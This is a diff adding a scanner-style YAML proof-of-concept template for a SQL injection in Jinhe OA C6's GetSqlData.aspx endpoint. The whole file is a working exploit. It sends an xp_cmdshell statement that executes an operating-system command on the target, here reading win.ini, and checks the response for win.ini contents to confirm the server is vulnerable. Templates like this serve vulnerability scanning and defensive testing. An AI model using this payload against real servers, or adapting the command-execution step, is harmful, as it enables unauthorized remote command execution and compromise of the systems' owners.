@@ -1,0 +1,22 @@
+id: poc-yaml-jinhe-C6-GetSqlData-sql-injection
+info:
+  name: 金和OA-C6-GetSqlData-SQL注入
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sql-injection
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/C6/Control/GetSqlData.aspx/.ashx"
+    body: |
+      exec master..xp_cmdshell 'type C:\\windows\\win.ini'
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+      - type: word
+        part: body
+        words:
+          - "[extensions]"
